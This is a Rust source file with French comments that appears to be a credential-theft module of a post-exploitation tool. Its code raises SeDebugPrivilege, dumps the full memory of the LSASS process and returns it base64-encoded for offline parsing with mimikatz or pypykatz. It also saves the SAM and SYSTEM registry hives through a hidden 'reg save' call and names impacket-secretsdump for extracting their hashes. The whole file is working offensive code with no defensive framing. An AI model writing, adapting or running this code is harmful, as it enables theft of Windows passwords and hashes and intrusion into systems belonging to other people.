// Extraction de credentials depuis LSASS via MiniDumpWriteDump (chargé dynamiquement).
// Retourne le dump en base64 pour analyse hors ligne (mimikatz, pypykatz…).
// Nécessite SeDebugPrivilege (droits élevés).

use base64::Engine;

pub fn dump_lsass() -> String {
    #[cfg(not(windows))]
    return "creds disponible sur Windows uniquement".to_string();

    #[cfg(windows)]
    unsafe {
        if let Err(e) = elevate_privilege("SeDebugPrivilege\0") {
            return format!("[err] privilège SeDebug: {}", e);
        }
        match do_lsass_dump() {
            Ok(b64) => format!("FILE:{}", b64),
            Err(e) => format!("[err] dump LSASS: {}", e),
        }
    }
}

pub fn dump_hive() -> String {
    #[cfg(not(windows))]
    return "credsmachine disponible sur Windows uniquement".to_string();

    #[cfg(windows)]
    {
        let tmp = std::env::temp_dir();
        let sam = tmp.join("sv_sam");
        let sys = tmp.join("sv_sys");
        let mut report = Vec::new();
        for (hive, path) in &[("HKLM\\SAM", &sam), ("HKLM\\SYSTEM", &sys)] {
            let _ = std::fs::remove_file(path);
            match run_reg_save(hive, path.to_str().unwrap_or("")) {
                Ok(_) => report.push(format!("[ok] {} → {}", hive, path.display())),
                Err(e) => report.push(format!("[ko] {}: {}", hive, e)),
            }
        }
        report.push("Analyse hors ligne : impacket-secretsdump -sam sv_sam -system sv_sys LOCAL".to_string());
        report.join("\n")
    }
}

#[cfg(windows)]
unsafe fn elevate_privilege(name_nul: &str) -> Result<(), String> {
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::Security::{
        AdjustTokenPrivileges, LookupPrivilegeValueW, SE_PRIVILEGE_ENABLED,
        TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, TOKEN_QUERY, LUID_AND_ATTRIBUTES,
    };
    use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken};
    use windows_sys::Win32::Foundation::LUID;

    let name_w: Vec<u16> = name_nul.encode_utf16().collect();
    let mut htoken = 0isize;
    if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &mut htoken) == 0 {
        return Err("OpenProcessToken".to_string());
    }
    let mut luid = LUID { LowPart: 0, HighPart: 0 };
    if LookupPrivilegeValueW(std::ptr::null(), name_w.as_ptr(), &mut luid) == 0 {
        CloseHandle(htoken);
        return Err("LookupPrivilegeValue".to_string());
    }
    let tp = TOKEN_PRIVILEGES {
        PrivilegeCount: 1,
        Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
    };
    AdjustTokenPrivileges(htoken, 0, &tp, 0, std::ptr::null_mut(), std::ptr::null_mut());
    let err = windows_sys::Win32::Foundation::GetLastError();
    CloseHandle(htoken);
    if err != 0 {
        return Err(format!("AdjustTokenPrivileges: {}", err));
    }
    Ok(())
}

#[cfg(windows)]
unsafe fn find_lsass_pid() -> Result<u32, String> {
    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
    };

    let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if snap == INVALID_HANDLE_VALUE {
        return Err("CreateToolhelp32Snapshot".to_string());
    }

    let mut entry: PROCESSENTRY32W = std::mem::zeroed();
    entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;

    if Process32FirstW(snap, &mut entry) == 0 {
        CloseHandle(snap);
        return Err("Process32First".to_string());
    }

    let target: Vec<u16> = "lsass.exe\0".encode_utf16().collect();
    loop {
        let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
        if len == target.len() - 1 && entry.szExeFile[..len] == target[..len] {
            CloseHandle(snap);
            return Ok(entry.th32ProcessID);
        }
        if Process32NextW(snap, &mut entry) == 0 {
            break;
        }
    }
    CloseHandle(snap);
    Err("lsass.exe introuvable".to_string())
}

#[cfg(windows)]
unsafe fn do_lsass_dump() -> Result<String, String> {
    use std::os::windows::io::AsRawHandle;
    use windows_sys::Win32::Foundation::CloseHandle;
    use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryW};
    use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

    // Type de MiniDumpWriteDump : chargé dynamiquement pour éviter une dépendance de feature.
    type MiniDumpFn = unsafe extern "system" fn(
        isize, u32, isize, u32,
        *const u8, *const u8, *const u8,
    ) -> i32;

    let lib_name: Vec<u16> = "dbghelp.dll\0".encode_utf16().collect();
    let hlib = LoadLibraryW(lib_name.as_ptr());
    if hlib == 0 {
        return Err("dbghelp.dll introuvable".to_string());
    }

    let fn_ptr = GetProcAddress(hlib, b"MiniDumpWriteDump\0".as_ptr());
    let mini_dump: MiniDumpFn = match fn_ptr {
        Some(f) => std::mem::transmute(f),
        None => return Err("MiniDumpWriteDump introuvable".to_string()),
    };

    let pid = find_lsass_pid()?;
    let hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if hproc == 0 {
        return Err(format!("OpenProcess({})", pid));
    }

    let tmp = std::env::temp_dir().join("tmp_lss.dmp");
    let file = std::fs::File::create(&tmp).map_err(|e| format!("fichier temp: {}", e))?;
    let hfile = file.as_raw_handle() as isize;

    // MiniDumpWithFullMemory = 0x00000002
    let ok = mini_dump(hproc, pid, hfile, 0x00000002,
        std::ptr::null(), std::ptr::null(), std::ptr::null());

    CloseHandle(hproc);
    drop(file);

    if ok == 0 {
        let _ = std::fs::remove_file(&tmp);
        return Err("MiniDumpWriteDump échoué".to_string());
    }

    let bytes = std::fs::read(&tmp).map_err(|e| e.to_string())?;
    let _ = std::fs::remove_file(&tmp);
    Ok(base64::engine::general_purpose::STANDARD.encode(&bytes))
}

#[cfg(windows)]
fn run_reg_save(hive: &str, path: &str) -> Result<(), String> {
    use std::os::windows::process::CommandExt;
    let out = std::process::Command::new("reg")
        .args(["save", hive, path, "/y"])
        .creation_flags(0x08000000)
        .output()
        .map_err(|e| e.to_string())?;
    if out.status.success() { Ok(()) } else {
        Err(String::from_utf8_lossy(&out.stderr).to_string())
    }
}
